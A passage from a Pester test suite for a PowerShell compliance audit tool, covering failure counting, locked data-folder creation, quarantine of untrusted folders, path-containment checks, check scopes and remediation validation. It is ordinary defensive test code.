                Remove-Variable -Name TestUntrustedLastError, TestUntrustedRoot -Scope Global -ErrorAction SilentlyContinue
            }
        }
    }

    It 'the scheduled audit counts failed runs in a fresh process, carrying the first failure time over' {
        $pwshExe = (Get-Process -Id $PID).Path
        # Every run fails just after the data folders are set up, the same way elevated (CI) or not: it
        # runs a copy of the tool whose own scheduled-audit.json is not JSON, and the tool's own config is
        # read with no permission check. A config override in the data folder would not do: an elevated
        # run uses one only if administrators own it and the folders it is in, and otherwise ignores it,
        # so the audit succeeds.
        $tool = Join-Path $TestDrive 'failing-tool'
        New-Item -ItemType Directory -Path $tool | Out-Null
        foreach ($part in @('app', 'config', 'src')) { Copy-Item -LiteralPath (Join-Path $script:RepoRoot $part) -Destination $tool -Recurse }
        Set-Content -LiteralPath (Join-Path (Join-Path $tool 'config') 'scheduled-audit.json') -Value 'not json'
        # The data folder is made first, the locked way when elevated, as the install makes it. A folder
        # this test made plainly would be writable by the runner's own account, so an elevated run would
        # rightly move it aside - taking last-error.json, and the count, with it.
        $root = Join-Path $TestDrive 'headless-failing'
        InModuleScope CEAudit -Parameters @{ Root = $root } {
            param($Root)
            $script:CEDataRootOverride = $Root
            try { Initialize-CEDataFolder -Path $Root | Out-Null }
            finally { $script:CEDataRootOverride = $null }
        }
        $auditScript = Join-Path (Join-Path $tool 'app') 'Invoke-CEScheduledAudit.ps1'
        $errPath = Join-Path $root 'last-error.json'
        & $pwshExe -NoProfile -File $auditScript -DataRoot $root *> $null
        $LASTEXITCODE | Should -Be 1
        $one = Get-Content -LiteralPath $errPath -Raw | ConvertFrom-Json
        $one.FailedRuns | Should -Be 1
        & $pwshExe -NoProfile -File $auditScript -DataRoot $root *> $null
        $LASTEXITCODE | Should -Be 1
        $two = Get-Content -LiteralPath $errPath -Raw | ConvertFrom-Json
        $two.FailedRuns | Should -Be 2
        "$($two.FirstFailure)" | Should -Be "$($one.FirstFailure)"
        "$($two.Time)" | Should -Not -Be "$($one.Time)"
        Test-Path -LiteralPath (Join-Path $root 'status.json') | Should -BeFalse -Because 'a failed run never writes status.json'
        @(Get-ChildItem -LiteralPath $TestDrive -Filter 'headless-failing.untrusted-*').Count | Should -Be 0 -Because 'each run kept the data folder it found'
    }

    It 'only the scheduled machine audit counts failures; the user probe never does' {
        $audit = (Get-Content -LiteralPath (Join-Path $script:RepoRoot 'app\Invoke-CEScheduledAudit.ps1') -Raw) -replace '\r\n', "`n"
        $audit | Should -Match 'Write-CEAuditFailure -DataRoot \$DataRoot '
        $audit | Should -Match 'Clear-CEAuditFailure -DataRoot \$DataRoot'
        $audit.IndexOf('Clear-CEAuditFailure') | Should -BeGreaterThan $audit.IndexOf('Write-CEStatus -Status') -Because 'the count is reset only once the new status.json is written'
        $probe = Get-Content -LiteralPath (Join-Path $script:RepoRoot 'app\Invoke-CEUserProbe.ps1') -Raw
        $probe | Should -Not -Match 'Write-CEAuditFailure|FailedRuns'
        $probe | Should -Match "Join-Path \`$base 'EngramicBaseline'" -Because 'its data folder is the user''s own, which Intune never reads'
        $probe | Should -Match '\$base = \$env:LOCALAPPDATA'
    }
}

Describe 'Locked-at-birth data folders (Initialize-CEDataFolder)' {
    It 'creates the data folder, and returns without error when it already exists' {
        $p = Join-Path $TestDrive 'idf-create'
        Initialize-CEDataFolder -Path $p | Should -Be $p
        Test-Path -LiteralPath $p -PathType Container | Should -BeTrue
        # Idempotent: a second call over an existing folder just returns it.
        { Initialize-CEDataFolder -Path $p } | Should -Not -Throw
        Test-Path -LiteralPath $p -PathType Container | Should -BeTrue
    }

    It 'when elevated, the folder is born administrator-owned and locked to SYSTEM and Administrators' {
        # This branch only runs where the suite runs elevated (CI). A standard user cannot set an
        # owner to Administrators, and only affects their own data, so there it gets a plain folder.
        if (-not (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
            Set-ItResult -Skipped -Because 'needs an elevated session'
            return
        }
        # Only the data folder and folders in it are made locked, so make this one the data folder.
        $p = Join-Path $TestDrive 'idf-locked'
        InModuleScope CEAudit -Parameters @{ P = $p } {
            param($P)
            $script:CEDataRootOverride = $P
            try { Initialize-CEDataFolder -Path $P | Out-Null }
            finally { $script:CEDataRootOverride = $null }
        }
        $acl = Get-Acl -LiteralPath $p
        "$($acl.GetOwner([Security.Principal.SecurityIdentifier]))" | Should -Be 'S-1-5-32-544'
        $acl.AreAccessRulesProtected | Should -BeTrue
        # Compared as SIDs: $acl.Access names accounts (NTAccount), which never equal a SecurityIdentifier.
        $sids = @($acl.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value })
        @($sids | Where-Object { @('S-1-5-18', 'S-1-5-32-544') -notcontains $_ }).Count | Should -Be 0 -Because "only SYSTEM and Administrators are granted anything (granted: $($sids -join ', '))"
        @($sids | Sort-Object -Unique) | Should -Be @('S-1-5-18', 'S-1-5-32-544')
    }

    It 'when elevated, locks or moves aside only the data folder and folders in it, and leaves any other folder as it is' {
        # An elevated caller once moved aside ANY folder it was handed that a standard user could write, and
        # made a locked one in its place: Write-CEStatus -Path elsewhere renamed the caller's folder (in CI,
        # Pester's own TestDrive). Only the data folder, however it is spelled, is the tool's to lock.
        $pd = Join-Path $TestDrive 'pd-scope'
        $root = Join-Path $pd 'EngramicBaseline'
        $reports = Join-Path $root 'reports'
        $outside = @((Join-Path $pd 'elsewhere'), (Join-Path $pd 'EngramicBaseline2'), (Join-Path $pd 'EngramicBaseline.untrusted-0123'), $pd)
        foreach ($d in @($outside) + @($reports)) {
            New-Item -ItemType Directory -Force -Path $d | Out-Null
            Set-Content -LiteralPath (Join-Path $d 'mine.txt') -Value 'mine'
        }
        InModuleScope CEAudit -Parameters @{ Root = $root; Reports = $reports; Outside = $outside; Pd = $pd; Drive = $TestDrive } {
            param($Root, $Reports, $Outside, $Pd, $Drive)
            $script:CEDataRootOverride = $Root
            try {
                Mock Test-CEIsWindows { $true }
                Mock Test-CEIsAdmin { $true }
                # Anything that is not empty looks writable by a standard user, so an elevated caller that
                # judged it would move it aside. A birth descriptor a standard user can apply (no owner).
                Mock Get-CELockedFolderProblem { if (@(Get-ChildItem -LiteralPath $Path -Force).Count) { "$Path is writable by S-1-5-21-1-2-3-1001" } else { '' } }
                Mock New-CELockedDirectorySecurity { $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); $s }
                Mock Write-CEEventEntry { }
                $spellings = @($Outside) + @((Join-Path (Join-Path $Root '..') 'elsewhere'), (Join-Path $Root '..'), $Drive)
                foreach ($d in $spellings) {
                    Initialize-CEDataFolder -Path $d -WarningVariable w -WarningAction SilentlyContinue | Should -Be $d
                    "$w" | Should -BeNullOrEmpty -Because "$d is not in the data folder"
                }
                # Write-CEStatus -Path elsewhere writes there and leaves the folder alone.
                $elsewhere = Join-Path $Pd 'elsewhere'
                Write-CEStatus -Status ([ordered]@{ schemaVersion = 1 }) -Path (Join-Path $elsewhere 'status.json') | Out-Null
                (Get-Content -LiteralPath (Join-Path $elsewhere 'status.json') -Raw | ConvertFrom-Json).schemaVersion | Should -Be 1
                # A missing folder outside it is made plainly, with no locked descriptor.
                $fresh = Join-Path $Pd 'fresh-elsewhere'
                Initialize-CEDataFolder -Path $fresh | Should -Be $fresh
                Test-Path -LiteralPath $fresh -PathType Container | Should -BeTrue
                foreach ($d in $Outside) { Get-Content -LiteralPath (Join-Path $d 'mine.txt') | Should -Be 'mine' -Because "$d is left where it was" }
                $names = @('elsewhere', 'EngramicBaseline', 'EngramicBaseline.untrusted-0123', 'EngramicBaseline2', 'fresh-elsewhere', 'mine.txt')
                @(Get-ChildItem -LiteralPath $Pd -Force | ForEach-Object { $_.Name } | Sort-Object) | Should -Be @($names | Sort-Object) -Because 'nothing outside the data folder is moved aside'
                @(Get-ChildItem -LiteralPath $Drive -Filter "$(Split-Path -Leaf $Pd).untrusted-*").Count | Should -Be 0
                @(Get-ChildItem -LiteralPath (Split-Path -Parent $Drive) -Filter "$(Split-Path -Leaf $Drive).untrusted-*").Count | Should -Be 0 -Because 'the test drive itself stays where Pester made it'
                Should -Invoke Get-CELockedFolderProblem -Times 0 -Exactly -Because 'a folder outside the data folder is not even judged'
                Should -Invoke New-CELockedDirectorySecurity -Times 0 -Exactly -Because 'nor made locked'
                Should -Invoke Write-CEEventEntry -Times 0 -Exactly
                foreach ($d in @($Outside) + @((Join-Path (Join-Path $Root '..') 'elsewhere'))) {
                    { Get-CEDataAsidePath -Path $d } | Should -Throw '*never moved aside*'
                    { Move-CEDataItemAside -Path $d } | Should -Throw '*never moved aside*'
                }

                # The data folder is still handled however it is spelled: '.', '..' and a trailing separator.
                foreach ($d in @((Join-Path (Join-Path $Root '.') 'reports'), (Join-Path (Join-Path (Join-Path $Root 'sub') '..') 'reports'), ($Reports + [IO.Path]::DirectorySeparatorChar))) {
                    Set-Content -LiteralPath (Join-Path $Reports 'mine.txt') -Value 'racer'
                    Initialize-CEDataFolder -Path $d -WarningVariable w -WarningAction SilentlyContinue | Should -Be $d
                    Test-Path -LiteralPath (Join-Path $Reports 'mine.txt') | Should -BeFalse -Because "$d is in the data folder, so a fresh folder took its place"
                    "$w" | Should -Match 'Moved an untrusted'
                }
                @(Get-ChildItem -LiteralPath $Pd -Directory -Filter 'EngramicBaseline.untrusted-*-reports').Count | Should -Be 3
                Test-Path -LiteralPath (Join-Path $Root 'sub') | Should -BeFalse -Because 'the .. was collapsed, not created'
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'judges whether a path is in the data folder on its full spelling, ignoring case, so .. and look-alike names do not count' -Skip:(-not ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows)) {
        # This decides whether the tool may lock a folder or move it aside, so '..' must never climb out of
        # the data folder, and a sibling whose name merely starts the same way is not in it.
        $here = Join-Path $TestDrive 'rel-here'
        New-Item -ItemType Directory -Path $here | Out-Null
        InModuleScope CEAudit -Parameters @{ Here = $here } {
            param($Here)
            $script:CEDataRootOverride = 'C:\ProgramData\EngramicBaseline'
            try {
                $in = @('C:\ProgramData\EngramicBaseline', 'C:\ProgramData\EngramicBaseline\', 'c:\programdata\ENGRAMICBASELINE\Reports',
                    'C:/ProgramData/EngramicBaseline/reports', 'C:\ProgramData\EngramicBaseline\.\reports', 'C:\ProgramData\EngramicBaseline\x\..\reports',
                    'C:\ProgramData\Other\..\EngramicBaseline\cache', 'C:\ProgramData\\EngramicBaseline\\logs')
                foreach ($p in $in) { (Resolve-CEDataPath -Path $p).InDataRoot | Should -BeTrue -Because "$p is in the data folder" }
                $out = @('C:\ProgramData\EngramicBaseline2', 'C:\ProgramData\EngramicBaseline2\reports', 'C:\ProgramData\EngramicBaseline.untrusted-0123',
                    'C:\ProgramData\EngramicBaseline-old\x', 'C:\ProgramData\EngramicBaseline\..', 'C:\ProgramData\EngramicBaseline\..\Other',
                    'C:\ProgramData\EngramicBaseline\reports\..\..\Other', 'C:\ProgramData', 'C:\', 'D:\ProgramData\EngramicBaseline',
                    '\\server\share\ProgramData\EngramicBaseline')
                foreach ($p in $out) { (Resolve-CEDataPath -Path $p).InDataRoot | Should -BeFalse -Because "$p is not in the data folder" }
                $r = Resolve-CEDataPath -Path 'C:\ProgramData\EngramicBaseline\sub\..\Reports\'
                $r.Path | Should -Be 'C:\ProgramData\EngramicBaseline\Reports'
                $r.Root | Should -Be 'C:\ProgramData\EngramicBaseline'
                $r.Relative | Should -Be 'Reports'
                (Resolve-CEDataPath -Path 'C:\ProgramData\EngramicBaseline').Relative | Should -Be ''
                # Only the spelling changes: an 8.3 name is kept as written, never looked up and expanded.
                ConvertTo-CEFullPath -Path 'C:\PROGRA~1\x\..\y' | Should -Be 'C:\PROGRA~1\y'
                # A UNC data folder: '..' cannot climb out of it either (Windows leaves that to the caller).
                $script:CEDataRootOverride = '\\server\share\EngramicBaseline'
                (Resolve-CEDataPath -Path '\\server\share\EngramicBaseline\reports').InDataRoot | Should -BeTrue
                (Resolve-CEDataPath -Path '\\server\share\EngramicBaseline\..\Other').InDataRoot | Should -BeFalse
                (Resolve-CEDataPath -Path '\\server\share\EngramicBaseline2').InDataRoot | Should -BeFalse
                # A relative path (or data folder) is taken from PowerShell's location, not the process directory.
                $script:CEDataRootOverride = '.\data'
                $process = [Environment]::CurrentDirectory
                Push-Location -LiteralPath $Here
                try {
                    [Environment]::CurrentDirectory = [IO.Path]::GetTempPath()
                    ConvertTo-CEFullPath -Path 'a\..\b' | Should -Be (Join-Path $Here 'b')
                    (Resolve-CEDataPath -Path (Join-Path (Join-Path $Here 'data') 'reports')).InDataRoot | Should -BeTrue
                    (Resolve-CEDataPath -Path '.\data\..\elsewhere').InDataRoot | Should -BeFalse
                }
                finally { Pop-Location; [Environment]::CurrentDirectory = $process }
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'never locks or moves aside a folder outside the data folder, whoever runs it (no mocks)' -Skip:(-not ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows)) {
        # The real path for whoever runs the suite: a standard user here, an administrator in CI, where a
        # status.json written to the runner's own temp folder used to move that folder aside (Pester's
        # TestDrive with it) and put a folder only administrators could change in its place.
        $mine = Join-Path $TestDrive 'status-elsewhere'
        New-Item -ItemType Directory -Path $mine | Out-Null
        Set-Content -LiteralPath (Join-Path $mine 'mine.txt') -Value 'mine'
        $before = (Get-Acl -LiteralPath $mine).Sddl
        $driveBefore = (Get-Acl -LiteralPath $TestDrive).Sddl
        Write-CEStatus -Status ([ordered]@{ schemaVersion = 1 }) -Path (Join-Path $mine 'status.json') | Should -Be (Join-Path $mine 'status.json')
        Write-CEStatus -Status ([ordered]@{ schemaVersion = 2 }) -Path (Join-Path $TestDrive 'status-in-drive.json') | Out-Null
        (Get-Content -LiteralPath (Join-Path $mine 'status.json') -Raw | ConvertFrom-Json).schemaVersion | Should -Be 1
        Get-Content -LiteralPath (Join-Path $mine 'mine.txt') | Should -Be 'mine'
        (Get-Acl -LiteralPath $mine).Sddl | Should -Be $before -Because 'the folder keeps the permissions its owner gave it'
        (Get-Acl -LiteralPath $TestDrive).Sddl | Should -Be $driveBefore
        @(Get-ChildItem -LiteralPath (Split-Path -Parent $TestDrive) -Filter "$(Split-Path -Leaf $TestDrive).untrusted-*").Count | Should -Be 0
        @(Get-ChildItem -LiteralPath $TestDrive -Filter '*.untrusted-*').Count | Should -Be 0
        # A missing folder outside the data folder is made plainly: it takes its parent's permissions.
        $fresh = Join-Path $TestDrive 'fresh-elsewhere'
        Initialize-CEDataFolder -Path $fresh | Should -Be $fresh
        (Get-Acl -LiteralPath $fresh).AreAccessRulesProtected | Should -BeFalse -Because 'it is not given the data folder''s locked, protected descriptor'
        # A bare file name has no folder to make: it is written to the current location.
        Push-Location -LiteralPath $fresh
        try { Write-CEStatus -Status ([ordered]@{ schemaVersion = 3 }) -Path 'bare-status.json' | Should -Be 'bare-status.json' }
        finally { Pop-Location }
        (Get-Content -LiteralPath (Join-Path $fresh 'bare-status.json') -Raw | ConvertFrom-Json).schemaVersion | Should -Be 3
    }

    It 'moves an untrusted data folder, or a folder in it, aside OUT of the data folder, and records where it went' {
        # A quarantine inside the data folder (<data>\reports.untrusted-<id>) is a tree a standard user may
        # control inside a tree SYSTEM later walks and deletes. It goes beside the data folder instead, and
        # the warning and an Application event (1003) name where, so nothing is lost silently.
        $pd = Join-Path $TestDrive 'pd-module-aside'
        $root = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'reports') | Out-Null
        Set-Content -LiteralPath (Join-Path $root 'reports\planted.txt') -Value 'racer'
        InModuleScope CEAudit -Parameters @{ Root = $root; Pd = $pd } {
            param($Root, $Pd)
            $script:CEDataRootOverride = $Root
            try {
                Mock Test-CEIsWindows { $true }
                Mock Test-CEIsAdmin { $true }
                # A birth descriptor a standard user can apply (no owner), and a stand-in trust check.
                Mock New-CELockedDirectorySecurity { $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); $s }
                Mock Get-CELockedFolderProblem { if (Test-Path -LiteralPath (Join-Path $Path 'planted.txt')) { "$Path is owned by S-1-5-21-1-2-3-1001" } else { '' } }
                Mock Write-CEEventEntry { }
                $reports = Join-Path $Root 'reports'
                Initialize-CEDataFolder -Path $reports -WarningVariable w -WarningAction SilentlyContinue | Should -Be $reports
                Test-Path -LiteralPath (Join-Path $reports 'planted.txt') | Should -BeFalse -Because 'a fresh folder took its place'
                @(Get-ChildItem -LiteralPath $Root -Recurse -Force -Filter '*.untrusted-*').Count | Should -Be 0 -Because 'nothing is quarantined inside the data folder'
                $aside = @(Get-ChildItem -LiteralPath $Pd -Directory -Filter 'EngramicBaseline.untrusted-*-reports')
                $aside.Count | Should -Be 1
                $asidePath = $aside[0].FullName
                Get-Content -LiteralPath (Join-Path $asidePath 'planted.txt') | Should -Be 'racer'
                "$w" | Should -Match ([regex]::Escape($asidePath))
                Should -Invoke Write-CEEventEntry -Times 1 -Exactly -ParameterFilter { $Id -eq 1003 -and $Type -eq 'Warning' -and $Message -like "*$asidePath*" }
                # The data folder itself goes beside itself.
                Set-Content -LiteralPath (Join-Path $Root 'planted.txt') -Value 'racer'
                Initialize-CEDataFolder -Path $Root -WarningAction SilentlyContinue | Out-Null
                @(Get-ChildItem -LiteralPath $Pd -Directory | Where-Object { $_.Name -match '^EngramicBaseline\.untrusted-[0-9a-f]{32}$' }).Count | Should -Be 1
                # Named as the installer names them (Get-CEAsidePath); nothing outside the data folder is moved aside.
                Get-CEDataAsidePath -Path (Join-Path $Root 'packs') | Should -Match ('^' + [regex]::Escape($Root) + '\.untrusted-[0-9a-f]{32}-packs$')
                { Get-CEDataAsidePath -Path 'X:\elsewhere\status-dir' } | Should -Throw '*not in the data folder*'
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'the birth descriptor names Administrators as owner, and matches the installer''s copy' {
        # Owner is in the descriptor (O:BA) so it is applied in the one call that creates the folder,
        # never forced afterwards onto a folder a racer may have made. Both copies stay identical.
        InModuleScope CEAudit {
            $sddl = (New-CELockedDirectorySecurity).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Owner)
            $sddl | Should -Be 'O:BA'
        }
    }

    It 'Get-CELockedFolderProblem keeps an admin-only folder (even with a benign read ACE) and rejects user-writable/wrong-owner/deny/link' {
        # The module judges a kept folder by trust, the same way the installer's Test-CELockedFolder
        # does: admin owner, not a link, no non-admin write/DAC/owner right, no deny against a trusted
        # SID. A read-only ACE an admin added is kept (Finding 4); a non-admin write ACE is rejected.
        InModuleScope CEAudit {
            $newAcl = {
                param([string]$OwnerSid, [object[]]$Rules)
                $o = New-Object psobject
                $o | Add-Member -MemberType ScriptMethod -Name GetOwner -Value ([scriptblock]::Create("param(`$t) [Security.Principal.SecurityIdentifier]::new('$OwnerSid')"))
                $o | Add-Member -MemberType NoteProperty -Name TestRules -Value @($Rules)
                $o | Add-Member -MemberType ScriptMethod -Name GetAccessRules -Value { param($e, $i, $t) $this.TestRules }
                return $o
            }
            $rule = { param([string]$Sid, [Security.AccessControl.FileSystemRights]$R, [string]$T = 'Allow') [pscustomobject]@{ IdentityReference = [Security.Principal.SecurityIdentifier]::new($Sid); FileSystemRights = $R; AccessControlType = [Security.AccessControl.AccessControlType]$T } }
            $adminOnly = @((& $rule 'S-1-5-18' 'FullControl'), (& $rule 'S-1-5-32-544' 'FullControl'))
            Mock Test-CEIsWindows { $true }
            Mock Test-CEDataLink { $false }
            Mock Get-Acl { & $newAcl 'S-1-5-32-544' $adminOnly }.GetNewClosure()
            Get-CELockedFolderProblem -Path 'X:\seal' | Should -BeNullOrEmpty
            Mock Get-Acl { & $newAcl 'S-1-5-32-544' ($adminOnly + @(& $rule 'S-1-5-32-545' 'ReadAndExecute')) }.GetNewClosure()
            Get-CELockedFolderProblem -Path 'X:\seal' | Should -BeNullOrEmpty -Because 'a read-only ACE grants no write (Finding 4)'
            Mock Get-Acl { & $newAcl 'S-1-5-21-1-2-3-1001' $adminOnly }.GetNewClosure()
            Get-CELockedFolderProblem -Path 'X:\seal' | Should -Match 'owned by S-1-5-21-1-2-3-1001'
            Mock Get-Acl { & $newAcl 'S-1-5-32-544' ($adminOnly + @(& $rule 'S-1-5-21-1-2-3-1001' 'Modify')) }.GetNewClosure()
            Get-CELockedFolderProblem -Path 'X:\seal' | Should -Match 'writable by S-1-5-21-1-2-3-1001'
            Mock Get-Acl { & $newAcl 'S-1-5-32-544' ($adminOnly + @(& $rule 'S-1-5-18' 'CreateFiles' 'Deny')) }.GetNewClosure()
            Get-CELockedFolderProblem -Path 'X:\seal' | Should -Match 'denies S-1-5-18'
            Mock Test-CEDataLink { $true }
            Get-CELockedFolderProblem -Path 'X:\seal' | Should -Match 'is a link'
        }
    }
}

Describe 'Per-user probe' {
    It 'runs end to end in a fresh process and writes user-status.json (User scope only)' {
        $pwshExe = (Get-Process -Id $PID).Path
        $root = Join-Path $TestDrive 'userprobe'
        & $pwshExe -NoProfile -File (Join-Path $script:RepoRoot 'app\Invoke-CEUserProbe.ps1') -DataRoot $root -Quiet *> $null
        $LASTEXITCODE | Should -Be 0
        $s = Get-Content (Join-Path $root 'user-status.json') -Raw | ConvertFrom-Json
        $s.scope | Should -Be 'User'
        $s.platform | Should -Be 'windows'
        $s.schemaVersion | Should -Be 1
        # same contract as the device status: self-describing checks, derived frameworks, plus the AI block
        $s.checks.'UA-10'.scope | Should -Be 'User'
        @($s.checks.PSObject.Properties.Name) | Should -Not -Contain 'FW-01'
        $s.frameworks.'ce-v3.3' | Should -Not -BeNullOrEmpty
        $s.ai | Should -Not -BeNullOrEmpty
        $s.ai.PSObject.Properties.Name | Should -Contain 'agentsFound'
        $s.ai.PSObject.Properties.Name | Should -Contain 'environments'
        $s.ai.contained | Should -BeIn @($true, $false)
        Test-Path (Join-Path $root 'last-error.json') | Should -BeFalse
    }

    It 'Get-CEAiPosture returns an AI inventory block' {
        $p = Get-CEAiPosture
        @($p.Keys) | Should -Contain 'agentsFound'
        @($p.Keys) | Should -Contain 'contained'
        @($p.Keys) | Should -Contain 'deviations'
        @($p.Keys) | Should -Contain 'environments'
        $p.contained | Should -BeOfType [bool]
    }
}

Describe 'Check scope (Machine vs User)' {
    It 'every check has a Machine or User scope' {
        foreach ($c in Get-CECheck) { $c.Scope | Should -BeIn @('Machine', 'User') -Because $c.Id }
    }
    It 'shadow-AI and WSL checks are User scope' {
        (Get-CECheck -Id 'UA-10').Scope | Should -Be 'User'
        (Get-CECheck -Id 'SC-12').Scope | Should -Be 'User'
    }
    It 'device checks are Machine scope' {
        (Get-CECheck -Id 'FW-01').Scope | Should -Be 'Machine'
        (Get-CECheck -Id 'SU-01').Scope | Should -Be 'Machine'
    }
    It 'Get-CECheck -Scope filters by scope' {
        @(Get-CECheck -Scope 'User').Id | Should -Contain 'UA-10'
        @(Get-CECheck -Scope 'Machine').Id | Should -Not -Contain 'UA-10'
        (@(Get-CECheck -Scope 'Machine').Count + @(Get-CECheck -Scope 'User').Count) | Should -Be @(Get-CECheck).Count
    }
    It 'Invoke-CEAuditCore -Scope User runs only User checks and tags findings' {
        $f = @(Invoke-CEAuditCore -Scope 'User')
        $f.Count | Should -BeGreaterThan 0
        ($f | Where-Object { $_.Scope -ne 'User' }) | Should -BeNullOrEmpty
        $f.CheckId | Should -Not -Contain 'FW-01'
    }
}

Describe 'Remediation parameters under strict mode' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'remediations only read required parameters directly (optional ones go through Get-CEParamValue)' {
        $dir = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Remediations'
        $problems = @()
        foreach ($file in Get-ChildItem $dir -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $calls = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].GetCommandName() -eq 'Register-CERemediation' }, $true)
            foreach ($call in $calls) {
                $text = $call.Extent.Text
                $id = [regex]::Match($text, "-Id '([^']+)'").Groups[1].Value
                $required = @([regex]::Matches($text, "Assert-CEParam \`$p '(\w+)'([^\r\n]*)") |
                    Where-Object { $_.Groups[2].Value -notmatch '-Optional' } | ForEach-Object { $_.Groups[1].Value })
                $used = @([regex]::Matches($text, '\$p\.(\w+)') | ForEach-Object { $_.Groups[1].Value } |
                    Where-Object { $_ -ne 'ContainsKey' } | Sort-Object -Unique)
                foreach ($u in $used) {
                    if ($required -notcontains $u) { $problems += "${id}: `$p.$u is not a required parameter" }
                }
            }
        }
        $problems -join "`n" | Should -BeNullOrEmpty
    }

    It 'PasswordPolicy-Set works with only a minimum length (regression)' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                if ($ArgumentList -contains 'accounts' -and $ArgumentList.Count -eq 1) {
                    return [pscustomobject]@{ ExitCode = 0; Output = @('a: Never', 'b: 0', 'c: 42', 'd: 0', 'e: None', 'f: 10', 'g: 10', 'h: 10', 'i: WORKSTATION') }
                }
                $script:netArgs = $ArgumentList
                [pscustomobject]@{ ExitCode = 0; Output = @('The command completed successfully.') }
            }
            $r = Invoke-CERemediation -Id 'PasswordPolicy-Set' -Parameters ([pscustomobject]@{ MinLength = 12 })
            $r.Message | Should -BeNullOrEmpty
            $r.Status | Should -Be 'Applied'
            $script:netArgs | Should -Contain '/minpwlen:12'
            $script:netArgs | Should -Not -Contain '/maxpwage:unlimited'
            $r.Undo[0].Command | Should -Be 'net.exe accounts /minpwlen:0'

            $r = Invoke-CERemediation -Id 'PasswordPolicy-Set' -Parameters @{ MaxAgeUnlimited = $true }
            $r.Status | Should -Be 'Applied'
            $script:netArgs | Should -Contain '/maxpwage:unlimited'
            $r.Undo[0].Command | Should -Be 'net.exe accounts /maxpwage:42'
        }
    }

    It 'every changeset item from an insecure device passes its own validation' {
        $f = @(Invoke-CEAuditCore)
        $cs = New-CEChangeset -Findings $f -Context (New-TestContext)
        $json = $cs | ConvertTo-Json -Depth 8 | ConvertFrom-Json
        InModuleScope CEAudit -Parameters @{ Items = @($json.Items) } {
            param($Items)
            Mock Get-NetFirewallRule { [pscustomobject]@{ Name = $Name } }
            Mock Get-MpPreference { [pscustomobject]@{ ExclusionPath = @('C:\'); ExclusionExtension = @('exe'); ExclusionProcess = @() } }
            $bad = @()
            foreach ($i in $Items) {
                $rem = Get-CERemediation -Id $i.RemediationId
                try { & $rem.Validate (ConvertTo-CEHashtable $i.Parameters) }
                catch { $bad += "$($i.ItemId) $($i.RemediationId): $($_.Exception.Message)" }
            }
            $bad -join "`n" | Should -BeNullOrEmpty
        }
    }
}

Describe 'Firewall rule remediation' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'accepts real Windows rule names with paths and braces' {
        InModuleScope CEAudit {
            $name = 'UDP Query User{A20A6EC8-FCD2-43F9-A42B-594FBB53F664}C:\Program Files\ExampleApp\bin\example-native.exe'
            Mock Get-NetFirewallRule { [pscustomobject]@{ Name = $name } }
            Mock Disable-NetFirewallRule { }
            $r = Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = $name; DisplayName = 'sherpa-onnx-ws-win32-x64.exe' }
            $r.Message | Should -BeNullOrEmpty
            $r.Status | Should -Be 'Applied'
            Should -Invoke Disable-NetFirewallRule -Times 1 -ParameterFilter { $Name -eq $name }
            $r.Undo[0].Command | Should -Be ("Enable-NetFirewallRule -Name '" + $name + "'")
        }
    }

    It 'rejects wildcards and names that do not match exactly one rule' {
        InModuleScope CEAudit {
            Mock Get-NetFirewallRule { @([pscustomobject]@{ Name = 'a' }, [pscustomobject]@{ Name = 'b' }) }
            { Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = '*' } } | Should -Throw '*not allowed*'
            { Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = 'Rule[1]' } } | Should -Throw '*not allowed*'
            { Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = 'c' } } | Should -Throw '*not found*'
        }
    }
}

Describe 'Windows Server support' {
    It 'recognises Windows Server even when the build matches a Windows 11 release' {
        InModuleScope CEAudit {
            $reg = @{ CurrentBuildNumber = '26100'; UBR = 4946; DisplayVersion = '24H2'; EditionID = 'ServerDatacenter'; ProductName = 'Windows Server 2025 Datacenter'; InstallationType = 'Server' }
            Mock Get-CERegistryValue { if ($reg.ContainsKey($Name)) { $reg[$Name] } else { $Default } }
            Mock Get-CEDsregStatus { @{} }
            Mock Test-CEMdmEnrolled { $false }
            Mock Get-CEConsoleUser { '' }
            Mock Get-CimInstance { [pscustomobject]@{ PartOfDomain = $false } }
            $ctx = Get-CEDeviceContext -Force
            $ctx.OSFamily | Should -Be 'Windows Server'
            $ctx.EditionClass | Should -Be 'Server'
            $reg.InstallationType = 'Client'; $reg.EditionID = 'Professional'
            (Get-CEDeviceContext -Force).OSFamily | Should -Be 'Windows 11'
            $script:CEDeviceContext = $null
        }
    }

    It 'passes a supported server, warns near the end date and fails after it' {
        Set-TestDevice -Kind Secure -ContextOverride @{ OSFamily = 'Windows Server'; EditionClass = 'Server'; EditionID = 'ServerDatacenter'; Build = 26100; FullBuild = '26100.4946' }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Pass'
        $f.Actual | Should -Match 'Windows Server 2025.*2034-11-14'

        Set-TestDevice -Kind Secure -ContextOverride @{ OSFamily = 'Windows Server'; EditionClass = 'Server'; Build = 14393; FullBuild = '14393.8000' }
